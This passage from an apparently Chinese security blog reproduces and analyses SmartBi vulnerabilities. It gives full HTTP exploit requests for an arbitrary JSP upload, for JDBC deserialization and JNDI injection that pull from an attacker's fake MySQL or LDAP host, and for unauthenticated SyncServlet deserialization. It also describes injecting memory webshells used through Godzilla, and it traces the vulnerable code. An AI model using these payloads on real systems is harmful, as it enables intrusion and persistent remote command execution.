src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173440049.png" alt="image-20250811224500461"></p></li><li><p>跟近getFileResource，在 URLLinkService 的 getFileResource被调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> FileResource <span class="hljs-title function_">getFileResource</span><span class="hljs-params">(String fileResourceID)</span> &#123;<br>        <span class="hljs-keyword">return</span> FileResourceDAO.getInstance().getFileResource(fileResourceID);<br>    &#125;<br><br></code></pre></td></tr></table></figure></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173441869.png" alt="image-20250811225032944"></p><p>存在 URLLinkService类，这代表我们可以通过反射调⽤该⽅法的任意类，同时参数可控</p></li></ol><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a><strong>payload：</strong></h4><ol><li><p>这是一个后台漏洞，需要登录获取⽤户Cookie</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173442903.png" alt="image-20250811220431605"></p></li><li><pre><code class="shell">POST /smartbi/vision/designer/imageimport.jsp HTTP/1.1Host: 127.0.0.1:18080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-File-Type: imageX-File-Name: 1.jspConnection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------2927288396864Content-Length: 16Cookie: FQPassword=; JSESSIONID=AE628E59E970577DD994954A693517C8&lt;%=&quot;CurlySean&quot;%&gt;<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><span class="hljs-number">3</span>. 访问<span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>age/<span class="hljs-number">1</span>.jsp<br><br>   发现出现CurlySean<br><br>#### **漏洞分析：**<br><br><span class="hljs-number">1</span>. smartbi<span class="hljs-regexp">/vision/</span>designer/imageimport.jsp ⽂件<br><br>   Smartbi\Tomcat\webapps\smartbi\vision\designer\imageimport.jsp<br><br>   ```java<br>   &lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>   &lt;%<br>   <span class="hljs-keyword">try</span> &#123;<br>   String path = request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>   <span class="hljs-keyword">File</span> dir = <span class="hljs-keyword">new</span> <span class="hljs-keyword">File</span>(path);<br>   <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>   dir.mkdirs();<br>   &#125;<br>   String fileName = <span class="hljs-keyword">new</span> String(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>   String fileType = request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>   <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>   response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>   response.resetBuffer();<br>   response.getOutputStream().<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>   <span class="hljs-keyword">return</span>;<br>   &#125;<br>   <span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">File</span>(path + fileName);<br>   FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">file</span>);<br>   <span class="hljs-keyword">int</span> bytesRead;<br>   <span class="hljs-keyword">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>   <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().<span class="hljs-keyword">read</span>(buf)) != -<span class="hljs-number">1</span>) &#123;<br>   fos.<span class="hljs-keyword">write</span>(buf, <span class="hljs-number">0</span>, bytesRead);<br>   &#125;<br>   fos.flush();<br>   fos.close();<br>   smartbi.net.sf.json.JSONObject jobj = <span class="hljs-keyword">new</span> smartbi.net.sf.json.JSONObject();<br>   jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>   <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>   String resultStr = jobj.toString();<br>   response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>   response.resetBuffer();<br>   response.getOutputStream().<span class="hljs-keyword">write</span>(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>   &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>   e.printStackTrace();<br>   &#125;<br>   %&gt;<br></code></pre></td></tr></table></figure>通过拼接获取⽂件上传的路径，没有则创建 从请求头重获取 X-File-Name 作为⽂件名，判断 X-File-Type 是否以 image 开头，不是则 报错 从请求体中读取输⼊流，写⼊⽂件中（对⽂件的后缀和内容没有任何过滤，直接上传Jsp⽂件即可）</code></pre></li></ol><h2 id="SmartBi-JDBC反序列化"><a href="#SmartBi-JDBC反序列化" class="headerlink" title="SmartBi-JDBC反序列化"></a>SmartBi-JDBC反序列化</h2><h4 id="payload：-2"><a href="#payload：-2" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/RMIServlet HTTP/1.1<br>Host: 192.168.1.8:18080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>If-Modified-Since: 0<br>Content-Type: application/x-www-form-urlencoded;charset=UTF-8<br>Content-Length: 69<br>Origin: http://192.168.1.8:18080<br>Connection: keep-alive<br>Referer: http://192.168.1.8:18080/smartbi/vision/index.jsp<br>Cookie: JSESSIONID=E5045F082547A15B8646D2E018EB591A<br>Priority: u=0<br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;&quot;password&quot;%<br>3a&quot;&quot;,&quot;maxConnection&quot;%3a100,&quot;user&quot;%3a&quot;&quot;,&quot;driverType&quot;%3a&quot;MYSQL&quot;,&quot;validationQ<br>uery&quot;%3a&quot;SELECT+1+FROM+DUAL&quot;,&quot;url&quot;%3a&quot;jdbc%3amysql%3a//xxxx.xxx.xxx.xxx%3a<br><span class="hljs-meta prompt_">3308/d9f8b01%</span><span class="language-bash">3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.</span><br>jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;name&quot;%3a&quot;JDBC&quot;,&quot;driver&quot;%3<br>a&quot;com.mysql.jdbc.Driver&quot;,&quot;id&quot;%3a&quot;&quot;,&quot;desc&quot;%3a&quot;&quot;,&quot;alias&quot;%3a&quot;&quot;,&quot;dbCharset&quot;%3<br>a&quot;&quot;,&quot;identifierQuoteString&quot;%3a&quot;`&quot;,&quot;transactionIsolation&quot;%3a-1,&quot;validationQ<br>ueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;authenticationType&quot;%3a&quot;STATIC&quot;&#125;]<br><br></code></pre></td></tr></table></figure><p>弹出计算器</p><p>首先搭建在公⽹VPS上搭建FakeMysql服务器</p><p>发送数据包后，我们的smartBi服务器尝试连接fakeMysql服务器，通过反序列化即可成功执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173447060.png" alt="image-20250812181350575"></p><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>通过查找SmartBi的Jar包，发现 mysql-connector-java 的依赖版本为5.1.44，是存在JDBC反序列 化漏洞的版本</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173448639.png" alt="image-20250812181512068"></p></li><li><p>需要找到⼀个发序列化链</p><p>pom.xml中，发现 common-collections 依赖，版本 3.2.1 ，存在CC反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173450003.png" alt="image-20250812182127446"></p></li><li><p>配置payload时，配置K1链⼦，⽣成payload即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173451624.png" alt="image-20250812182159537"></p></li><li><p>漏洞产⽣点在 DataSourceService 中的 testConnection 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>       MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>   &#125;<br></code></pre></td></tr></table></figure></li><li><p>正常调⽤会⾛到 MetaDataServiceImpl 的 testConnection 中，执⾏该语句，服务器就会向远 程FakeMysql尝试连接，就会接收到FakeMysql返回的恶意序列化数据，在反序列化过程中，就会触发我 们所构造的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173454054.png" alt="image-20250812182609648"></p></li><li><p>要调⽤ DataSourceService 的 testConnection ⽅法，我们可以通过 &#x2F;vision&#x2F;RMIServle t 的反射调⽤某类的某⽅法进⾏调⽤，构造payload如下（在POST数据包中，需要进⾏⼀次URL编码， 否则会报错）</p></li></ol><p>在进⾏⽅法调⽤时，会将我们传⼊的字符串类型参数 params ，转换成⼀个JsonArray类型的参数</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173457556.png" alt="image-20250812182902720"></p><p>步⼊ execute ⽅法中，以下部分代码，可以将JSON对象转化成Object对象</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173458919.png" alt="image-20250812182957914"></p><p>然后将var5对象传⼊ testConnection ⽅法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>再进⼀步，会将dataSource中存储的信息⼀⼀拿出，⽤于后续的数据源连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>       <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>       ds.setId(UUIDGenerator.generate());<br>       ds.setName(dataSource.getName());<br>       ds.setAlias(dataSource.getAlias());<br>       ds.setDriver(dataSource.getDriver());<br>       ds.setDesc(dataSource.getDesc());<br>       ds.setDbCharset(dataSource.getDbCharset());<br>       ds.setUrl(dataSource.getUrl());<br>       ds.setUser(dataSource.getUser());<br>       ds.setDriverType(dataSource.getDriverType());<br>       ds.setMaxConnection(dataSource.getMaxConnection());<br>       ds.setValidationQuery(dataSource.getValidationQuery());<br>       ds.setPassword(dataSource.getPassword());<br>       ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>       ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>       ds.setAuthenticationType(dataSource.getAuthenticationType());<br>       <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>           <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>           ds.setPassword(dbDs.getPassword());<br>       &#125;<br></code></pre></td></tr></table></figure><h4 id="内存马："><a href="#内存马：" class="headerlink" title="内存马："></a>内存马：</h4><ol><li><p>配置好⼯具类型、中间件、内存⻢类型、密码等信息，点击⽣成class⽂件</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173501931.png" alt="image-20250812183232630"></p></li><li><p>使⽤javaChains⼯具进⾏注⼊，选择⾃定义字节码，将我们⽣成的class⽂件上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173504653.png" alt="image-20250812183305769"></p></li><li><p>⽤我们的Poc将内存⻢注⼊进去</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173506011.png" alt="image-20250812183343304"></p></li><li><p>配置哥斯拉密码密钥信息，同时设置请求配置（与内存⻢设置请求头⼀样）</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173507432.png" alt="image-20250812183359493" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173509318.png" alt="image-20250812183413264" style="zoom:50%;" /></li><li><p>可以看到成功连接并执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173511109.png" alt="image-20250812183434734"></p></li></ol><h2 id="SmartBi-JNDI注⼊"><a href="#SmartBi-JNDI注⼊" class="headerlink" title="SmartBi-JNDI注⼊"></a>SmartBi-JNDI注⼊</h2><h4 id="payload：-3"><a href="#payload：-3" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/RMIServlet HTTP/1.1<br>Host: 192.168.1.8:18080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>If-Modified-Since: 0<br>Content-Type: application/x-www-form-urlencoded;charset=UTF-8<br>Content-Length: 483<br>Origin: http://192.168.1.8:18080<br>Connection: keep-alive<br>Referer: http://192.168.1.8:18080/smartbi/vision/index.jsp<br>Cookie: JSESSIONID=E5045F082547A15B8646D2E018EB591A<br>Priority: u=0<br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;&quot;password&quot;%<br>3a&quot;&quot;,&quot;maxConnection&quot;%3a100,&quot;user&quot;%3a&quot;&quot;,&quot;driverType&quot;%3a&quot;MYSQL&quot;,&quot;validationQ<br>uery&quot;%3a&quot;SELECT+1+FROM+DUAL&quot;,&quot;url&quot;%3a&quot;JNDI:ldap://xxxx.xxx.xxx.xxx:50389/0<br>7e967&quot;,&quot;name&quot;%3a&quot;JDBC&quot;,&quot;driver&quot;%3a&quot;com.mysql.jdbc.Driver&quot;,&quot;id&quot;%3a&quot;&quot;,&quot;des<br>c&quot;%3a&quot;&quot;,&quot;alias&quot;%3a&quot;&quot;,&quot;dbCharset&quot;%3a&quot;&quot;,&quot;identifierQuoteString&quot;%3a&quot;`&quot;,&quot;trans<br>actionIsolation&quot;%3a-1,&quot;validationQueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;auth<br>enticationType&quot;%3a&quot;STATIC&quot;&#125;]<br><br></code></pre></td></tr></table></figure><p>使⽤JavaChains⽣成Payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173514363.png" alt="image-20250812183630155"></p><p>发送数据包成功执⾏命令，弹出计算器</p><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>漏洞点同上</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173600292.png" alt="image-20250812183759234"></p></li><li><p>⾛⼊ ConnectionPool 的 getConnection ⽅法⾥，有这么⼀个判断，如果获取的URL是以 JDN I: 开头，就会将 JNDI: 截取，对剩下的部分调⽤ lookup() </p><p><img src="C:\Users\95227\Desktop\image-20250812184549730.png" alt="image-20250812184549730"></p></li><li><p>⽣成payload JNDI:ldap:&#x2F;&#x2F;xxxx.xxx.xxx.xxx:50389&#x2F;07e967</p></li></ol><h4 id="内存马：-1"><a href="#内存马：-1" class="headerlink" title="内存马："></a>内存马：</h4><ol><li><p>内存⻢可以使⽤JavaChains进⾏注⼊，选择调⽤Jmg⽣成注⼊内存⻢</p><p>（配置内存⻢的⼯具种类、内存⻢类型、中间件类型等等，然后点击⽣成）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173517313.png" alt="image-20250812184700407"></p></li><li><p>发送Payload进⾏注⼊内存⻢</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173518704.png" alt="image-20250812184730041"></p></li><li><p>打开哥斯拉，配置⽬标信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173520026.png" alt="image-20250812184746918"></p></li><li><p>记住根据配置的请求头，在哥斯拉中设置请求配置</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250812184756424.png" alt="image-20250812184756424"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173521845.png" alt="image-20250812184804807"></p></li><li><p>可以看到内存⻢注⼊成功，可以连接并进⾏命令执⾏</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173527813.png" alt="image-20250812184820515"></p></li></ol><h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h4 id="payload：-4"><a href="#payload：-4" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/SyncServlet HTTP/1.1<br>Host:127.0.0.1:18080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip<br>Content-Length: 139<br><br>type=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=xxx.xxx.xxx.xxx:330<br>8&amp;dbName=dec03db?detectCustomCollations=true%26autoDeserialize=yes<br></code></pre></td></tr></table></figure><p>通过JavaChains起⼀个fakeMysql服务器，发送Poc让smartBi服务器连接fakeMysql，即可触发反序列 化漏洞</p><p>直接弹出计算器</p><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>查看web.xml⽂件， SyncServlet 配置到了 &#x2F;vision&#x2F;SyncServlet 路径下，且经过查看，并没 有配置检查是否登录的过滤器，因此访问该路径不需要登录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">servlet&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>SyncServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>smartbi.freequery.sync.SyncServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>SyncServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/vision/SyncServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>在 SyncServlet 的 doPost ⽅法中， (new SyncResources()).synchronize(type, dbSe rver, clientId, dbUser, fieldName, querySql) 中将接受的参数传⼊ synchronize 中</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173531532.png" alt="image-20250812185324525"></p></li><li><p>跟进synchronize </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);    <span class="hljs-comment">//跟进</span><br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>跟进 DbUtil.getConnection(…) 中</p><p>主要有以下三个部分 ：</p><p>检查是否⽀持 dbType 类型的数据库连接</p><p>根据传⼊参数，拼接数据库连接源</p><p>配置信息，进⾏连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driverType = DBType.valueOf(dbType.toUpperCase());<span class="hljs-comment">//判断dbType手机都在数据库类型表中</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<span class="hljs-comment">//通过传入的参数进行url拼接</span><br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<span class="hljs-comment">//配置数据库连接信息，并且进行连接</span><br>    &#125;<br><br></code></pre></td></tr></table></figure></li><li><p>最重要的部分在第⼆块，拼接恶意的数据库连接源</p><p>serverName设置为我们的fakemysql服务器，dbName根据mysql-connection的版本进⾏配置（这⾥为 5.1.44版本）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://xxx.xxx.xxx.xxx:3306/jdbcdec03db?detectCustomCollations=<span class="hljs-literal">true</span>%2<br>6autoDeserialize=<span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173534696.png" alt="image-20250812190104269"></p></li><li><p>根据doPost⽅法中接受参数名，构造poc即可（注意&amp;需要进⾏URL编码）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span 